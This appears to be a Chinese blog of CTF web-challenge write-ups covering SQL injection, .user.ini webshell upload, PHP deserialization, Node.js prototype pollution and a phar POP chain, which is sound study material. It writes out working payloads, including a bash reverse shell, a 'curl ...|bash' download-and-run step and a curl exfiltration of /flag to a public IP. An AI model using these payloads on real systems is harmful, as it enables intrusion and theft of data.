<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">column_name</span>))from(<span class="hljs-name">information_schema</span>.columns)where(<span class="hljs-name">table_name</span>)like(&#x27;H4rDsq1&#x27;))),<span class="hljs-number">1</span>))#<br>&#x27;or(<span class="hljs-name">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">column_name</span>))from(<span class="hljs-name">information_schema</span>.columns)where(<span class="hljs-name">table_name</span>)like(&#x27;H4rDsq1&#x27;)))))#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101537385.png" srcset="/img/loading.gif" lazyload alt="image-20250410153704148"></p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">id</span>,&#x27;:&#x27;,username,&#x27;:&#x27;,password))from(<span class="hljs-name">H4rDsq1</span>))),<span class="hljs-number">1</span>))#<br>&#x27;or(<span class="hljs-name">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">id</span>,&#x27;:&#x27;,username,&#x27;:&#x27;,password))from(<span class="hljs-name">H4rDsq1</span>)))))#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101541228.png" srcset="/img/loading.gif" lazyload alt="image-20250410154120127"></p>
<p>这里只有部分flag，还要看另一部分</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>((<span class="hljs-name">right</span>(<span class="hljs-name">password</span>,<span class="hljs-number">25</span>))))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101544505.png" srcset="/img/loading.gif" lazyload alt="image-20250410154433175"></p>
<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>这道题和之前也是比较像的</p>
<p>首先上传了绕过短标签<code>&lt;?</code>的图片马，然后上传了.htaccess，发现直接用蚁剑连接webshell1.jpg时报错</p>
<p>并不能想明白是为啥，这时候我们需要了解下面几个配置文件的区别</p>
<ul>
<li>php.ini</li>
</ul>
<blockquote>
<p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。<br>PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，.user.ini中设置。</p>
</blockquote>
<ul>
<li>.user.ini</li>
</ul>
<blockquote>
<p>.user.ini文件<br>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>它比.htaccess(分布式配置文件)用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi(进程管理器)运行的php都可以用这个方法。<br>Php配置项中有两个比较有意思的项<br>auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。<br>auto_append_file类似，只是在文件后面包含。</p>
</blockquote>
<ul>
<li>.htaccess</li>
</ul>
<blockquote>
<p>.htaccess叫分布式配置文件，它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。并且子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。一般来说，如果你的虚拟主机使用的是Unix或Linux系统，或者任何版本的Apache网络服务器，从理论上讲都是支持.htaccess的。<br>目录规则:一般我们将.htaccess文件放置在网站的根目录，控制所在目录及所有子目录，而如果放置在子目录中，会受上级目录中.htaccess文件影响，是不起任何作用的。<br>.htaccess可以实现：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
</blockquote>
<p>所以.htaccess相对而言是比较针对Apache网络服务器，这时候我们看到上传路径里竟然有PHP文件</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102123817.png" srcset="/img/loading.gif" lazyload alt="image-20250410212343734"></p>
<p>这时候我们可以考虑到上传.user.ini，</p>
<p>因为“不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi(进程管理器)运行的php都可以用这个方法”、“auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数”</p>
<p>所以这里上传了.user.ini（注意上传图片马的时候改名，使其对应.user.ini）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102125651.png" srcset="/img/loading.gif" lazyload alt="image-20250410212520554"></p>
<p>然后用蚁剑连接PHP文件</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102128835.png" srcset="/img/loading.gif" lazyload alt="image-20250410212814747"></p>
<p>注意这里的index.php并不是我们网页的那个PHP文件（里面实际上什么代码也没有）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102128640.png" srcset="/img/loading.gif" lazyload alt="image-20250410212850479"></p>
<p>网页的是这个，里面有上传文件的代码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102129429.png" srcset="/img/loading.gif" lazyload alt="image-20250410212919295"></p>
<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>给了源码地址</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102149539.png" srcset="/img/loading.gif" lazyload alt="image-20250410214956445"></p>
<p>测出注入点在username</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102150414.png" srcset="/img/loading.gif" lazyload alt="image-20250410215052333"></p>
<p>然后还可以知道返回字段数为3</p>
<p><code>&#39;union select 1,2,3#</code></p>
<p>但是联合查询包括报错注入都不好使</p>
<p>然后发现提示</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102154133.png" srcset="/img/loading.gif" lazyload alt="image-20250410215425046"></p>
<p>这是一段Base32加Base64的编码，解密结果为<code>select * from user where username = &#39;$name&#39;</code></p>
<p>但到这里就没有思路了</p>
<p>然后看了看源码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> echo <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>	die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>	<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br>		<span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>				echo <span class="hljs-variable">$flag</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里发现成功登录就会输出flag，同时这里可以利用我们select出来的“123”<code>$arr = mysqli_fetch_row($result);</code></p>
<p>然后就是这一题的重难点：<strong>联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据</strong></p>
<p>我们本地尝试一下</p>
<p>先创建几个数据</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102207781.png" srcset="/img/loading.gif" lazyload alt="image-20250410220746683"></p>
<p>此时一查就可以构造一条虚假用户</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102208344.png" srcset="/img/loading.gif" lazyload alt="image-20250410220850239"></p>
<p>但是如果你再次刷新该库，数据并没有保存。（我认为这就是大佬们说的构造虚拟的数据，如有错误，欢迎指正）</p>
<p>注意上面代码的逻辑，我们此时完全可以修改select出来的“1，2，3”，达到类似<code>&#39; union select 1,&#39;admin&#39;,&#39;matrix&#39;</code>的效果，使其能够满足<code>if($arr[1] == &quot;admin&quot;)&#123;if(md5($password) == $arr[2])&#123;</code></p>
<p>我们先MD5加密一下matrix</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">21B72C0B7ADC5C7B4A50FFCB90D92DD6<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219346.png" srcset="/img/loading.gif" lazyload alt="image-20250410221922238"></p>
<p><code>&#39; union select 1,&#39;admin&#39;,&#39;21b72c0b7adc5c7b4a50ffcb90d92dd6&#39;#</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219700.png" srcset="/img/loading.gif" lazyload alt="image-20250410221904453"></p>
<p>得到flag</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219093.png" srcset="/img/loading.gif" lazyload alt="image-20250410221950823"></p>
<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>我们直接看最后，这种题我们一定是要反序列化的，所以要过了<code>is_valid</code> 函数，</p>
<p>这一函数检查字符串中的每个字符是否在 ASCII 码的 32 到 125 之间，</p>
<p>只要是之间就可以</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172135777.png" srcset="/img/loading.gif" lazyload alt="image-20250217213527736"></p>
<p>然后我们接着看代码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172139618.png" srcset="/img/loading.gif" lazyload alt="image-20250217213900559"></p>
<p>发现析构函数<code>__destruct()</code>，然后我们再看<code>process()</code>，发现我们要执行<code>read()</code>才能得到flag</p>
<p>那这里就要求我们<code>op==2</code>，且<code>op</code>不能<code>===2</code>，可以用数字<code>2</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172142000.png" srcset="/img/loading.gif" lazyload alt="image-20250217214238906"></p>
<p>这里我们直接解码后，有不可见字符</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172200665.png" srcset="/img/loading.gif" lazyload alt="image-20250217220053614"></p>
<p>原来是类修饰符的问题</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172203504.png" srcset="/img/loading.gif" lazyload alt="image-20250217220331463"></p>
<p>修改成public（竟然可以直接修改类修饰符，长见识了）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172205493.png" srcset="/img/loading.gif" lazyload alt="image-20250217220555437"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>FileHandler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>op%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>filename%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>.%<span class="hljs-number">2</span>Fflag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>content%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Hello+World%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>

<p>出flag</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172205629.png" srcset="/img/loading.gif" lazyload alt="image-20250217220508586"></p>
<h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><p>给了源码，这一题考察的是<strong>Undefsafe模块原型链污染</strong>。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202035758.png" srcset="/img/loading.gif" lazyload alt="image-20250220203453664"></p>
<p>Undefsafe 是 Nodejs 的一个第三方模块，其核心是一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt;  2.0.3版本）中存在原型链污染漏洞（CVE-2019-10795），攻击者可利用该漏洞添加或修改 Object.prototype 属性。</p>
<p>这里我们知道了除merge函数之外的可以导致原型链污染的函数</p>
<p>除此之外，<strong>Lodash模块也可以导致原型链污染</strong>，这里提一下lodash中常见的导致原型链污染的方法：</p>
<ol>
<li>lodash.defaultsDeep方法</li>
<li>lodash.merge 方法</li>
<li>lodash.mergeWith 方法</li>
<li>lodash.set 方法</li>
<li>lodash.setWith 方法</li>
</ol>
<p>言归正传，下面是Undefsafe 导致原型链污染的一个例子</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> a = require(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)    <span class="hljs-comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="hljs-comment">// this is [object Object]</span><br>a(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;just a evil!&#x27;</span>&#125;)<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)    <span class="hljs-comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="hljs-comment">// this is just a evil!</span><br><br></code></pre></td></tr></table></figure>

<p>我们先看源码，</p>
<p>先用语法糖写了个类<code>Notes</code>，我们需要注意<code>Notes</code>类的两个成员方法<code>get_note</code>与<code>edit_note</code>，这两个成员方法都用到了<code>undefsafe</code>函数，一会从这两个成员方法入手，进行原型链污染</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202041756.png" srcset="/img/loading.gif" lazyload alt="image-20250220204108557"></p>
<p>然后写了几个路由<code>/&#39;、&#39;/add_note&#39;、&#39;/edit_note&#39;、&#39;/delete_note&#39;、&#39;/notes&#39;、&#39;/status&#39;</code>，</p>
<p>用deepseek的话说，这段代码实现了一个基于 <strong>Express</strong> 框架的简单笔记应用，使用 <strong>Pug</strong> 作为模板引擎。用户可以添加、编辑、删除和查看笔记，同时还有一个 <code>/status</code> 路由用于执行系统命令并返回状态信息。</p>
<p>要注意<code>&#39;/edit_note&#39;</code>路由，其中用到了<code>edit_note</code>这一成员方法，而且三个参数都是我们可控的（而<code>&#39;/notes&#39;</code>中的<code>get_note</code>的参数并不是完全可控，因此不能利用）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202049527.png" srcset="/img/loading.gif" lazyload alt="image-20250220204942483"></p>
<p>通过上面的<code>&#39;/edit_note&#39;</code>路由，我们可以进行原型链污染，但原型链污染了之后怎么利用？</p>
<p>这时候就要看<code>&#39;/status&#39;</code>路由，它会将commands字典的所有的值进行命令执行</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202054474.png" srcset="/img/loading.gif" lazyload alt="image-20250220205424428"></p>
<p>而且这个 for (let index in commands) 不只是遍历 commands 表，还会去回溯遍历原型链上的属性</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202057536.png" srcset="/img/loading.gif" lazyload alt="image-20250220205716490"></p>
<p>所以我们的思路就清楚了</p>
<p>我们先在<code>&#39;/edit_note&#39;</code>路由污染原型链的属性，然后在<code>/status</code>处遍历原型链中我们污染的属性去执行恶意代码</p>
<p>下面我们需要用到公网IP，尽量搞一个云服务器或者vps</p>
<p>这里我想的是反弹shell，所以先写一个反弹shell的一句话木马</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/公网IP/nc端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202104824.png" srcset="/img/loading.gif" lazyload alt="image-20250220210436784"></p>
<p>然后我们在刚刚一句话木马的目录下启动Python 3 中HTTP 服务器，并将其监听在端口 80 上（我这里是监听在80端口，大家可以根据自己的 安全组策略 去安排）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202114458.png" srcset="/img/loading.gif" lazyload alt="image-20250220211420416"></p>
<p>这时我们再写payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span>=__proto__.cmd&amp;author=curl http://公网IP:80/shell.txt|bash&amp;raw=matrix<br></code></pre></td></tr></table></figure>

<p>注意先开nc监听（这里的端口要与一句话木马中的nc端口一样，不要和python服务的端口搞混了），初学者要搞清楚这俩端口的区别，分别代表着不同的服务（一个是python的HTTP服务，一个用来接受反弹shell）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>

<p>然后用hackbar去POST传递payload</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202115467.png" srcset="/img/loading.gif" lazyload alt="image-20250220211511264"></p>
<p>接受反弹shell后找一找目录，在<code>/flag</code>里找到flag</p>
<p>也可以不反弹shell，下面的payload应该可行（实际比赛似乎做不到，怎么知道flag在哪个目录呢？）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/edit_note<br><br><span class="hljs-comment"># post提交</span><br><span class="hljs-attribute">id</span>=__proto__.bb&amp;author=curl -F <span class="hljs-string">&#x27;flag=@/flag&#x27;</span> 公网IP:nc端口&amp;<span class="hljs-attribute">raw</span>=a<br><br><span class="hljs-comment"># nc监听端口</span><br>nc -lvp 8080<br><br>访问/status<br></code></pre></td></tr></table></figure>

<h1 id="Dest0g3-520迎新赛-PharPOP"><a href="#Dest0g3-520迎新赛-PharPOP" class="headerlink" title="[Dest0g3 520迎新赛]PharPOP"></a>[Dest0g3 520迎新赛]PharPOP</h1><p>之前做过phar的题，但没想到可以这样考</p>
<p>按照我的理解，phar之于php，就如jar之于java</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503041425216.png" srcset="/img/loading.gif" lazyload alt="image-20250220231750162"></p>
<p>manifest 压缩文件的属性等信息，以序列化存储；调用phar:&#x2F;&#x2F;伪协议，可读取 .phar文件，而且Phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化。</p>
<p>注意：Phar需要PHP &gt;&#x3D; 5.2 ，而且在php.init中将phar.readonly设为Off。</p>
<p>我们先读一下源代码，</p>
<p>代码里写了几个类，还有一个waf函数过滤类名，</p>
<p>最后是一个长度判断，规定了<code>$_POST[1])</code>长度小于55，小于55我们肯定不能在这构造pop链了，但是我们可以利用类D中的<code>$_POST[0]</code>构造pop链</p>
<p><strong>然后大体的思路我们已经明白了：<code>$_POST[0]</code>构造phar文件，其中写有pop链；而<code>$_POST[1])</code>则写有序列化后的类D的对象，以此来操纵phar文件的写入读取。</strong></p>
<p>但是这里依然有三个问题：</p>
<ol>
<li>如何构造pop链去找到并读出flag？</li>
<li>源码末尾的<code>throw new Error(&quot;start&quot;);</code>会导致程序抛出异常，无法利用程序正常的结束来触发<code>__destruct</code>，如何绕过？</li>
<li>如何绕过waf函数？</li>
</ol>
<p>我们逐步解决这三个问题，</p>
<p>第一步，构造pop链，</p>
<p>利用点在air类的<code>echo new $p($value);</code>，可以想办法控制类名和参数，利用PHP原生类进行目录遍历或者文件读取（详见<a target="_blank" rel="noopener" href="https://www.extrader.top/posts/35c0085d/%EF%BC%89">https://www.extrader.top/posts/35c0085d/）</a></p>
<p>在PHP原生类中，可遍历目录类有以下几个：</p>
<ul>
<li>DirectoryIterator 类</li>
<li>FilesystemIterator 类</li>
<li>GlobIterator 类</li>
</ul>
<p>以DirectoryIterator 类为例，我们可以配合glob:&#x2F;&#x2F;协议使用模式匹配来寻找我们想要的文件路径（详见<a target="_blank" rel="noopener" href="https://php.golaravel.com/wrappers.glob.html%EF%BC%89">https://php.golaravel.com/wrappers.glob.html）</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*f*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure>

<p>其他遍历目录类同理，然后可读取文件类有：</p>
<ul>
<li>SplFileObject 类</li>
</ul>
<p>我们可以像类似下面这样去读取一个文件的一行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br><br></code></pre></td></tr></table></figure>

<p>综合一下，构造pop链，并形成phar文件</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">air</span></span>&#123;<br>    public <span class="hljs-variable">$p</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tree</span></span>&#123;<br>    public <span class="hljs-variable">$name</span>;<br>    public <span class="hljs-variable">$act</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">apple</span> </span>&#123;<br>    public <span class="hljs-variable">$xxx</span>;<br>    public <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = new tree;<br><span class="hljs-variable">$b</span> = new apple;<br><span class="hljs-variable">$c</span> = new air;<br><span class="hljs-variable">$d</span> = new tree;<br><br><span class="hljs-regexp">//</span> <span class="hljs-variable">$d</span>-&gt;act=<span class="hljs-string">&#x27;FilesystemIterator&#x27;</span>;<br><span class="hljs-regexp">//</span> <span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$d</span>;<br><span class="hljs-regexp">//</span> <span class="hljs-variable">$b</span>-&gt;xxx = <span class="hljs-variable">$c</span>;<br><span class="hljs-regexp">//</span> <span class="hljs-variable">$b</span>-&gt;flag = <span class="hljs-string">&#x27;glob:///*f*&#x27;</span>;<br><span class="hljs-regexp">//</span> <span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><br><span class="hljs-regexp">//</span><span class="hljs-variable">$d</span>-&gt;act=<span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$d</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$b</span>-&gt;xxx = <span class="hljs-variable">$c</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$b</span>-&gt;flag = <span class="hljs-string">&quot;/fflaggg&quot;</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><br><span class="hljs-variable">@unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);   <span 